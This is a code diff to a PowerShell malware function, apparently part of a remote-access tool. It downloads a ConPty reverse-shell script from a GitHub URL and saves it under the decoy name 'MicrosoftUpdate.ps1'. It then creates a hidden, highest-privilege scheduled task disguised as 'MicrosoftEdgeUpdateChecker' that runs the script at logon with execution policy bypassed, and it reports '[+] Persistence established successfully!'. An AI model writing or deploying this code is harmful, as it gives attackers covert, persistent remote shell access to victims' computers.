@@ -127,17 +127,15 @@ function Connect-ZiPo {
 
         $targetPath = Join-Path $folder "MicrosoftUpdate.ps1"
         $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
-
         Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
 
         $taskName = "MicrosoftEdgeUpdateChecker"
 
-
-        if (-not (schtasks /Query /TN $taskName -ErrorAction SilentlyContinue)) {
-           schtasks /Create /TN "MicrosoftEdgeUpdateChecker" /SC ONSTART `
-              /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
-              /DELAY 0001:00 `
-              /RL HIGHEST /RU "SYSTEM" /F
+        schtasks /Query /TN $taskName 2>$null
+        if ($LASTEXITCODE -ne 0) {
+            schtasks /Create /TN $taskName /SC ONLOGON `
+                /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
+                /RL HIGHEST /F | Out-Null
         }
 
         return "[+] Persistence established successfully!"
